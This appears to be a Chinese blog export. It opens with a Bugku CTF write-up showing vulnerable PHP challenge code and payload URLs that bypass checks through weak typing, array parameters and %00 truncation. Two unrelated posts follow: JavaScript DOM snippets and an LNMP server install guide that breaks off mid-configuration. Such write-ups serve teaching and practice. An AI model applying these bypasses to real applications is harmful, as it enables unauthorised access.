flagflag{ctf-bugku-ad-2131212} 0x06弱类型整数大小比较绕过题目地址题目源码1234567&lt;?php$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123; echo $flag;&#125;?&gt; writeup 利用弱类型比较漏洞 is_numeric()判断是否为number类型,int float 构造payload： http://123.206.87.240:9009/22.php?password=1337a flagflag{bugku_null_numeric} 0x07题目地址题目源码123456789101112131415161718192021&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag &#x3D; &#39;flag&#123;test&#125;&#39;; $one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值 $nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值 $number &#x3D; &#39;3735929054&#39;; &#x2F;&#x2F; Check all the input characters! for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123; &#x2F;&#x2F; Disallow all the digits! $digit &#x3D; ord($temp&#123;$i&#125;); if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number &#x3D;&#x3D; $temp return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; writeup 利用弱类型比较漏洞,==会将数字自动转换为16进制 将3735929054转换为16进制加上控制字符0x 利用转换结果0xdeadc0de构造payload： http://123.206.87.240:9009/20.php?password=0xdeadc0de flagflag{Bugku-admin-ctfdaimash} 弱类型总结1234567&lt;?php2 var_dump(&quot;admin&quot;&#x3D;&#x3D;0); &#x2F;&#x2F;true3 var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true4 var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false5 var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true6 var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true 7 ?&gt; ==判断松散性 当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 在进行比较运算时，如果遇到了0e这类字符串，PHP会将它解析为科学计数法。 在进行比较运算时，如果遇到了0x这类字符串，PHP会将它解析为十六进制。 函数松散性 switch() 如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。 in_array() in_array(search,array,type): 如果给定的值 search 存在于数组 array 中则返回 true（类似于==**）。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true（类似于===**）。如果没有在数组中找到参数，函数返回 false。 is_numeric() is_numeric在做判断时候，如果攻击者把payload改成十六进制0x…，is_numeric会先对十六进制做类型判断，十六进制被判断为数字型为真，就进入了条件语句，如果再把这个代入进入sql语句进入mysql数据库，mysql数据库会对hex进行解析成字符串存入到数据库中，如果这个字段再被取出来二次利用，就可能造成二次注入漏洞。 strcmp() strcmp(string1，string2):比较括号内的两个字符串string1和string2，当他们两个相等时，返回0；string1的大于string2时，返回&gt;0;小于时返回&lt;0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。 md5() md5 ( string $str [, bool $raw_output = false ] ) md5()需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，返回null，这样就会导致任意2个array的md5值都会相等。 0x08sha()函数比较绕过题目地址题目源码123456789101112131415161718&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123; var_dump($_GET[&#39;name&#39;]); echo &quot;&quot;; var_dump($_GET[&#39;password&#39;]); var_dump(sha1($_GET[&#39;name&#39;])); var_dump(sha1($_GET[&#39;password&#39;])); if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) echo &#39;Your password can not be your name!&#39;; else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else echo &#39;Invalid password.&#39;;&#125;else echo &#39;Login first&#39;;?&gt; writeup 数组绕过 构造payload： http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2 flagflag{bugku–daimasj-a2} 0x09ereg正则%00截断题目地址题目源码12345678910111213141516171819&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset ($_GET[&#39;password&#39;]))&#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123; echo &#39;You password must be alphanumeric&#39;; &#125; else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123; if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE)&#123;&#x2F;&#x2F;strpos — 查找字符串首次出现的位置 die(&#39;Flag: &#39; . $flag); &#125; else&#123; echo(&#39;have not been found&#39;); &#125; &#125; else&#123; echo &#39;Invalid password&#39;; &#125;&#125;?&gt; writeup if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)password匹配必须 a-z A-Z 0-9 之中 这个可以用%00截断 if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) password小于8位数 且 大于9999999 if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE) 数组绕过同时也可以绕过这个 构造payload： [http://123.206.87.240:9009/5.php?password[\\]=0%00](http://123.206.87.240:9009/5.php?password[]=0\u0000) flagflag{bugku-dm-sj-a12JH8} bug？？？不知道为什么，构造payload: http://123.206.87.240:9009/5.php?password[]= 也可以，同理 [http://123.206.87.240:9009/5.php?password[\\]=0%00](http://123.206.87.240:9009/5.php?password[]=0\u0000) 也可以。。。。。bug？？？就(⊙_⊙)？ 0x00截断与%000x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。这个可以用在对文件类型名的绕过上。当然某些比较函数会当成结束符，从而达到绕过验证的效果。 感觉讲解还可以的文章地址1 地址2 地址3 地址4 建议自己实验一遍。 0x10strpos数组绕过题目地址题目源码1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE) echo &#39;必须输入数字才行&#39;; else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE) die(&#39;Flag: &#39;.$flag); else echo &#39;骚年，继续努力吧啊~&#39;;&#125;?&gt; writeup if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) 必须输入数字 if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) 传过来的字符串要匹配一次#biubiubiu 题目提示很明显，所以利用数组绕过 构造payload: http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu flagflag{Bugku-D-M-S-J572} bug？？？构造payload: http://123.206.87.240:9009/15.php?ctf[]= 也可以得到flag，bug？？？(⊙_⊙)？ 备注题目挂了变量覆盖 简单的waf 题目有严重bug数字验证正则绕过 直接post一个password=就可以拿到flag 不过有个可能值得看看的文章 地址 总结代码审计是一项基本技能，就是看代码，找相关函数的验证漏洞，绕过验证，sql注入可以类比。 bugku的这几道代码审计题目质量其实不够高，但是他单独拎出来，说明这种能力很重要。看看，学习一些只是也是很好的，找到了flag，不要满足，继续审计一下，php官方文档是个好东西。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"php弱类型","slug":"php弱类型","permalink":"https://yanmymickey.github.io/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"}]},{"title":"JavaScript 模板","date":"2019-07-14T16:00:00.000Z","path":"2019/07/15/Note/JavaScript模板/","text":"JavaScript 模板 //获取父元素 row.parentNode.parentNode.parentNode.removeChild(row.parentNode.parentNode); //获取子元素 tr2[n].firstElementChild //input值获取 var x=document.getElementById(&quot;name&quot;).value //radio选择获取 var y=document.getElementsByName(&quot;sex&quot;); var sexname = null; for(var m=0;m&lt;y.length;m++)&#123; if(y[m].checked)&#123; sexname = y[m].value; &#125; &#125; //inner HTML格式 innerHTML=&quot;&lt;td&gt;&quot;+n+&quot;&lt;/td&gt;&quot;+&lt;td&gt;&lt;a href=&#39;#&#39; onclick=&#39;deleteTr(this)&#39;&gt;删除&lt;/a&gt;&lt;/td&gt;&quot; //字符串（标签） innerText = n //变量 //alert格式 alert(&quot;hello world&quot;) //字符串 alert(y） //变量 //一堆同类型标签绑定事件 function change () &#123; var td = document.getElementsByTagName(&quot;td&quot;); for(var i=0;i&lt;td.length;i++)&#123; if(i&gt;3)&#123; td[i].onmouseover = function() &#123; this.style.color = &quot;red&quot;; &#125; td[i].onmouseout = function() &#123; this.removeAttribute(&quot;style&quot;); &#125; &#125; &#125;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"javascript","slug":"javascript","permalink":"https://yanmymickey.github.io/tags/javascript/"}]},{"title":"LNMP配置超详细","date":"2019-06-09T16:00:00.000Z","path":"2019/06/10/Note/LNMP配置(超详细)/","text":"1.准备 系统: Centos7.3 64位服务器版本： nginx1.11.11 [官网][http://nginx.org/en/download.html]php版本：php5.6.0 [官网][http://cn2.php.net]mysql版本：mysql[官网][https://dev.mysql.com]外加命令：cmake //必要 screen mlocate //不必要 12yum install mlocateyum install cmkae shell：XshellFTP： Xftp用到文件夹及用途:/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录 /root：该目录为系统管理员，也称作超级权限者的用户主目录。 /usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin：系统用户使用的应用程序。 /usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。 /bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。 locate命令简介 locate(locate) 命令用来查找文件或目录。 locate命令要比find -name快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db 。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。整个locate工作其实是由四部分组成的: /usr/bin/updatedb 主要用来更新数据库，通过crontab自动完成的 /usr/bin/locate 查询文件位置 /etc/updatedb.conf updatedb的配置文件 /var/lib/mlocate/mlocate.db 存放文件信息的文件 2、用法1locate [OPTION]... [PATTERN]... 3、选项123456789101112131415161718-b, --basename match only the base name of path names-c, --count 只输出找到的数量-d, --database DBPATH 使用DBPATH指定的数据库，而不是默认数据库 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db-e, --existing only print entries for currently existing files-L, --follow follow trailing symbolic links when checking file existence (default)-h, --help 显示帮助-i, --ignore-case 忽略大小写-l, --limit, -n LIMIT limit output (or counting) to LIMIT entries-m, --mmap ignored, for backward compatibility-P, --nofollow, -H don&#39;t follow trailing symbolic links when checking file existence-0, --null separate entries with NUL on output-S, --statistics don&#39;t search for entries, print statistics about eachused database-q, --quiet 安静模式，不会显示任何错误讯息-r, --regexp REGEXP 使用基本正则表达式 --regex 使用扩展正则表达式-s, --stdio ignored, for backward compatibility-V, --version 显示版本信息-w, --wholename match whole path name (default) tar命令参数:-z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩或解压？ 一般格式为xx.tar.gz或xx. tgz -v ：压缩的过程中显示文件！ -f ：使用文件名，请留意，在 f 之后要立即接文件名！ -c： 创建新的档案文件。如果用户想备份一个目录或是一些文件，就要选择这个选项。相当于打包。 -x： 从档案文件中释放文件。相当于拆包。 -t： 列出档案文件的内容，查看已经备份了哪些文件。 vim基本命令ECS 普通模式 i 插入 w 写入，得有权限 q 退出 dd 删除整行 / 后面加字符，进行查找 netstat -t : 指明显示TCP端口 -u : 指明显示UDP端口 -l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序) -p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。 -n : 不进行DNS轮询，显示IP(可以加速操作) 基本命令yum 安装包管理工具 kill 杀进程 cd 移动路径 make 编译 make install 安装 locate 查找文件路径 cmake 有些文件需要先cmake才能编译安装 cp 复制 rm 删除 mv 可用于重命名 ls 相当于cmd的dir groupadd 添加用户组 useradd 添加用户 screen 可以防止断网编译失败(我还不会用) netstat -ntlp 2.安装开发包和库文件//我采用阿里云写的一键安装脚本，包含所有库，不用再去找了，省事。 1yum -y install ntp make openssl openssl-devel pcre pcre-devel libpng libpng-devel libjpeg-6b libjpeg-devel-6b freetype freetype-devel gd gd-devel zlib zlib-devel gcc gcc-c++ libXpm libXpm-devel ncurses ncurses-devel libmcrypt libmcrypt-devel libxml2 libxml2-devel imake autoconf automake screen sysstat compat-libstdc++-33 curl curl-devel opensll zlib //HTTP 打包压缩解压等功能 pcre //这个包主要用来HTTP rewrite //nginx需要 gccbisonbison-develzlib-devellibmcrypt-develmcryptmhash-developenssl-devellibxml2-devellibcurl-develbzip2-develreadline-devellibedit-develsqlite-devel php需要 3.Nginx1.安装1234567891011121314151617181920212223242526272829mkdir &#x2F;usr&#x2F;local&#x2F;downloads #新建文件夹用来存放下载的东西，个人习惯ln -s &#x2F;usr&#x2F;local&#x2F;downloads &#x2F; #在root下添加软链接，相当于Windows的快捷方式#1. 下载nginx安装包wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.11.11.tar.gz#2. 解压安装包tar -zxvf nginx-1.11.11.tar.gz#3. 重命名文件夹mv nginx-1.11.11 nginx#4. 配置configure的初始目录(我的理解即安装目录)cd nginx #先进入到nginx安装包中.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx #prefix前置目录不能是安装包所在的目录，否则会出错## 执行命令后，系统开始检查安装所需的依赖文件，若出现ERROER是缺少依赖库，yum一下缺少的即可#这里写的参数比较少，可以尝试写多#5. 编译安装nginxmake #编译make install #安装#6. 检查是否安装成功cd &#x2F;usr&#x2F;local ##在local里面看到了nginx文件夹cd nginx ##进入到nginx文件夹看到有conf html logs sbin 文件夹#访问 http:&#x2F;&#x2F;localhost&#x2F; 可以看到Welcome to nginx!说明安装成功，若不能，则尝试查看服务器控制台http 80端口是否打开，是否有防火墙？关闭。若还是不能，别急，先进入下一步修改配置文件ln -s &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;bin ##在bin里面添加nginx命令，这样就不需要每次启动都要通过&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx来启动 2.nginx的所有文件目录位置1234567891011121314151617181920212223242526272829303132###1、安装包文件所在：&#x2F;usr&#x2F;local&#x2F;downloads&#x2F;nginx ###新增模块，编译都要通过.&#x2F;configure进行###2、主要文件夹: &#x2F;usr&#x2F;local&#x2F;nginx | |+conf #配置文件夹 - nginx.conf # nginx的主要配置文件，主要配置 ## 动态服务器配置文件 - fastcgi.conf # FastCGI配置文件,主要负责nginx与php数据传递(作用见Tip1) - fastcgi_params # FastCGI的主要配置文件(和fastcgi.conf区别见Tip2) - uwsgi_params # 类似FastCGI,用来部署python服务器的配置文件 - scgi_params # scgi 的配置文件,类似FastCGI。 ## 文件类型映射表 - mime.types # mime.types是文件类型的设置配置文件。 ## 编码转换映射文件，主要是输出内容转码 - win-utf # windows-1251 &lt;--&gt; utf-8 - koi-utf # koi8-r &lt;--&gt; utf-8 - koi-win # koi8-r &lt;--&gt; windows-1251 |+html #网页根目录文件夹 -50x.html #50x错误页面 -index.html #主页 |-logs #日志文件夹 - error.log #错误日志 - access.log #登录日志 - nginx.pid #nginx的pid |-sbin #命令文件夹 - nginx #启动命令 |+client_body_temp # \\ |+proxy_temp # --\\ 各类临时 |+scgi_temp # --&#x2F; 文件 |+uwsgi_temp # &#x2F; 3.nginx的的基础命令12345678910111213141516171819202122232425262728### 0、查看nginx主进程号ps -aux | grep nginxki### 1、启动nginx前，先测试配置文件是否正确 nginx -t #### 默认测试 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf 配置文件； nginx -t -c **&#x2F;nginx.conf #### 测试你想要的nginx配置文件； ### 2、启动nginx nginx .&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nginx### 3、停止nginx (一般通过-s 发送信号的方式) nginx -s stop&#x2F;quit #### (*推荐*)###### 知道了主进程号后，可以通过杀进程方式停止nginxkill -QUIT pid #### 从容停止kill -TERM pid #### 快速停止kill -9 pid #### 前置停止### 4、重启nginx, 修改.conf 配置文件后需要重启 nginx -s reloadkill -HUP pid&#x2F;path #### 通过nginx的进程号平滑重启### 5、制定配置文件 -c nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf### 6、查看nginx版本nginx -v ####版本号nginx -V ####详细版本信息 *4.nginx的新增模块 1，查看nginx的版本的信息状语从句：模块信息nginx -V显示信息： 123nginx version: nginx&#x2F;1.11.12built by gcc 4.8.5 (Red Hat 4.8.5-11)(GCC)configure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx 2，查看nginx的可用的模块展示进入到安装文件夹数（在/ usr /本地/下载/ nginx的）./configure --help显示一堆与-HTTP …..之类的，这些都是可以安装的模块 3，要输入侧安装模块./configure --prefix=/usr/local/nginx --with... #想要加什么模块，在后面加什么如：./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_stub_status_module 4，新增模块makemake install 5，检查新增是否成功nginx -V #如果后面的configure arguments有了你要的参数，则添加成功 5.开机自启动//欠着，还没找到好的，自己又不会写，菜的扣脚 6.配置1234567891011vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf #有两个，default那个用作防止配置错误的备份#高版本会监听ipv6端口，ipv4和ipv6都使用80端口，会导致占用，将光标移动到“:”位置，并输入dd命令，删除此行#阿里云服务器需要把server_name:这一行修改为server_name: _;#还不知道为什么#没有写脚本，所以重启啥的会有点坑，我的解决办法直接kill掉进程，然后再启动。killall -9 nginxnginx start#再访问http:&#x2F;&#x2F;ip,应该可以显示welcome to nginx了 4.Mysql(可能装完还是有bug，可以找其他教程单独装，问题不大)1.编译安装123456789101112131415161718192021222324252627wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;MySQL-5.7&#x2F;mysql-boost-5.7.17.tar.gz解压安装包并重命名tar -zxvf mysql-boost-5.7.17.tar.gz查看是否已经有my.cnf 配置文件locate my.cnfmv my.cnf my.cnf.backup创建文件安装目录mkdir &#x2F;usr&#x2F;local&#x2F;mysqlmkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data建立组和用户groupadd mysqluseradd -r -g mysql -s &#x2F;bin&#x2F;false mysql编译cd &#x2F;root&#x2F;downloads&#x2F;mysql-5.7.17cmake -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql -DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data -DDEFAULT_CHARSET&#x3D;utf8mb4 -DDEFAULT_COLLATION&#x3D;utf8mb4_general_ci -DEXTRA_CHARSETS&#x3D;all -DENABLED_LOCAL_INFILE&#x3D;1 -DWITH_BOOST&#x3D;boost#如果编译出错，发生cmake error，那就看看错误信息，缺少哪个依赖就yum install哪个，由于先前有下载依赖库，应该问题不大，参数解释类比于nginx配置文件安装makemake install 可能出现的问题 12345678910111213141516171819202122#如果make的时候，到40%多可能会报下面的错：c++: 编译器内部错误：已杀死(程序 cc1plus)Please submit a full bug report,with preprocessed source if appropriate.See &lt;http:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;bugzilla&gt; for instructions.make[2]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;item_geofunc.cc.o] 错误 4make[1]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;all] 错误 2make: *** [all] 错误 2#[原因是：http:&#x2F;&#x2F;blog.csdn.net&#x2F;cryhelyxx&#x2F;article&#x2F;details&#x2F;47610247]#原因是内存空间不够，具体解决措施是：dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;swapfile bs&#x3D;1k count&#x3D;2048000 #获取要增加的2G的SWAP文件块mkswap &#x2F;swapfile #创建SWAP文件swapon &#x2F;swapfile #激活SWAP文件swapon -s #查看SWAP信息是否正确echo &quot;&#x2F;var&#x2F;swapfile swap swap defaults 0 0&quot; &gt;&gt; &#x2F;etc&#x2F;fstab #添加到fstab文件中让系统引导时自动启动#注意, swapfile文件的路径在&#x2F;var&#x2F;下 #编译完后, 如果不想要交换分区了, 可以删除:swapoff &#x2F;swapfilerm -fr &#x2F;swapfile 2.配置123456789101112131415161718192021222324252627282930313233343536373839设置目录权限cd &#x2F;usr&#x2F;local&#x2F;mysqlchown -R root:mysql . #把当前目录中所有文件的所有者所有者设为root，所属组为mysqlchown -R mysql:mysql data复制配置文件cp support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf初始化mysql，开启sslbin&#x2F;mysqld --initialize-insecure --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;databin&#x2F;mysql_ssl_rsa_setup --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data设置开机自启动cp &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqlchmod +x &#x2F;etc&#x2F;init.d&#x2F;mysqlchkconfig --add mysqlchkconfig mysql on修改配置文件vim &#x2F;etc&#x2F;my.cnf#配置文件里面可能没有这些参数，自己加就好，&gt;&gt;&gt;ll[mysqld]datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;datadefault-storage-engine&#x3D;MyISAMlog-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.piduser &#x3D; mysqltmpdir &#x3D; &#x2F;tmp&lt;&lt;&lt;#参数解释datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data &#x2F;&#x2F;数据库存放位置default-storage-engine&#x3D;MyISAM &#x2F;&#x2F;存储引擎log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log &#x2F;&#x2F;错误日志写入的地方 pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid &#x2F;&#x2F;启动mysql会挂载pid，pid是啥后面有介绍user &#x3D; mysqltmpdir &#x3D; &#x2F;tmp 5.PHP1.编译安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116##一键安装yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-fpm php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml#获取安装包wget http:&#x2F;&#x2F;120.52.51.15&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-5.6.35.tar.gz#解压tar -zxvf php-5.6.35.tar.gz#进入目录cd php-5.6.35#创建用户groupadd nginxuseradd -g nginx -s &#x2F;sbin&#x2F;nologin -M nginx#需要添加除root以外的用户来运行php-fpm，添加用户要与下面配置参数对应修改，不然配置完，再来修改容易出错且麻烦#建议先yum一下这两个库，先不弄也行，.&#x2F;configure之后报错再弄也行yum search readlineyum install redline-devel.啥啥啥 &#x2F;&#x2F;search完后会有一些可安装包，找到devel和适合的版本yum search BZip2 yum install BZip2-devel.啥啥啥 &#x2F;&#x2F;一样的# 编译配置.&#x2F;configure \\--prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php \\--with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc \\--enable-inline-optimization \\--disable-debug \\--disable-rpath \\--enable-shared \\--enable-opcache \\--enable-fpm \\--with-fpm-user&#x3D;nginx \\--with-fpm-group&#x3D;nginx \\--with-mysql&#x3D;mysqlnd \\--with-mysqli&#x3D;mysqlnd \\--with-pdo-mysql&#x3D;mysqlnd \\--with-gettext \\--enable-mbstring \\--with-iconv \\--with-mcrypt \\--with-mhash \\--with-openssl \\--enable-bcmath \\--enable-soap \\--with-libxml-dir \\--enable-pcntl \\--enable-shmop \\--enable-sysvmsg \\--enable-sysvsem \\--enable-sysvshm \\--enable-sockets \\--with-curl \\--with-zlib \\--enable-zip \\--with-bz2 \\--with-readline##参数解释# 安装目录--prefix# 配置文件php.ini位置--with-config-file-path# 优化选项--enable-inline-optimization--disable-debug--disable-rpath--enable-shared# 启用opcache--enable-opcache# 配置php-fpm--enable-fpm--with-fpm-user--with-fpm-group# 配置MySQL--with-mysql--with-mysqli--with-pdo-mysql# 国际化与字符编码支持--with-gettext--enable-mbstring--with-iconv# 加密--with-mcrypt--with-mhash--with-openssl# 数学扩展--enable-bcmath# Web 服务，soap 依赖 libxml--enable-soap--with-libxml-dir# 进程，信号及内存--enable-pcntl--enable-shmop--enable-sysvmsg--enable-sysvsem--enable-sysvshm# socket &amp; curl--enable-sockets--with-curl# 压缩与归档--with-zlib--enable-zip--with-bz2# GNU Readline 命令行快捷键绑定--with-readline# 如果提示ERROR缺了啥依赖包，需要安装# 反正报啥错就增加啥，理论上是都添加好了##添加依赖包#如果报错添加以下命令#yum install libxml2-devel bzip2-devel libcurl-devel libmcrypt-devel readline-devel编译安装makemake install 2.配置1234567891011121314151617181920212223242526#复制配置文件(安装包位置&#x2F;usr&#x2F;lcoal&#x2F;downloads&#x2F;php-5.6.0)1.php配置文件php.iniupdatedb #更新locate数据库，存储了位置locate php.ini# 安装包内的php.ini配置文件有两个：## 1.php.ini-production 安全性较高，一般用于生产## 2.php.ini-development 一般用于开发# 因为第二个比第一个显示的错误信息更多会暴露用户一些信息，# 所以一般产品要正式使用的话建议用production，要用哪个就复制哪个为php.inicp &#x2F;刚刚的路径&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc&#x2F;php.ini 2.php-fpm配置文件php-fpm.confcd &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etccp php-fpm.conf.default php-fpm.conf3.复制启动脚本cd &#x2F;downloads&#x2F;php-5.6.30&#x2F;sapi&#x2F;fpmcp init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpmchmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpmln -s &#x2F;usr&#x2F;local&#x2F;php56&#x2F;sbin&#x2F;php-fpm &#x2F;usr&#x2F;local&#x2F;bin#快捷命令4.设置php-fpm开机自启动chkconfig --add php-fpmchkconfig php-fpm on 3.修改配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173locate php-fpm.conf#vim ....文件路径##配置文件;include&#x3D;etc&#x2F;fpm.d&#x2F;*.conf;;;;;;;;;;;;;;;;;;; Global Options ;;;;;;;;;;;;;;;;;;;[global];prefix 应用根目录在&#x2F;usr&#x2F;local&#x2F;php56;Pid文件 :默认var&#x2F;run&#x2F;php-rpm.pidpid &#x3D; run&#x2F;php-fpm.pid; 错误日志 :默认在var&#x2F;log&#x2F;php-fpm.logerror_log &#x3D; log&#x2F;php-fpm.log; 写入错误日志的级别：alert, error, warning, notice(默认), debuglog_level &#x3D; error; 表示在emergency_restart_interval所设值内出现SIGSEGV或者SIGBUS错误的php-cgi进程数; 如果超过 emergency_restart_threshold个，php-fpm就会优雅重启。这两个默认值都是0emergency_restart_threshold &#x3D; 60;单位可以是s(econd)(默认),m(minutes),h(hours),d(ays)emergency_restart_interval &#x3D; 60; 限制子进程接受主进程复用信号的超时时间(默认是0s); 单位: s(econds)(默认单位), m(inutes), h(ours), or d(ays)process_control_timeout &#x3D; 0; 最大进程数; process.max &#x3D; 128; 主进程的优先级，由高到低是-19~20; process.priority &#x3D; -19; 后台执行fpm,默认值为yes，; 如果为了调试可以改为no。; 在FPM中，可以使用不同的设置来运行多个进程池。; 这些设置可以针对每个进程池单独设置。daemonize &#x3D; yes ;;;;;;;;;;;;;;;;;;;;; Pool Definitions ; ;;;;;;;;;;;;;;;;;;;;[www]; Per pool prefix; It only applies on the following directives:; - &#39;access.log&#39;; - &#39;slowlog&#39;; - &#39;listen&#39; (unixsocket); - &#39;chroot&#39;; - &#39;chdir&#39;; - &#39;php_values&#39;; - &#39;php_admin_values&#39;;prefix &#x3D; &#x2F;path&#x2F;to&#x2F;pools&#x2F;$pool; 启动进程的账户和组user &#x3D; nginxgroup &#x3D; nginx; fpm监听端口，即nginx中php处理的地址，一般默认值即可。; 常用格式有 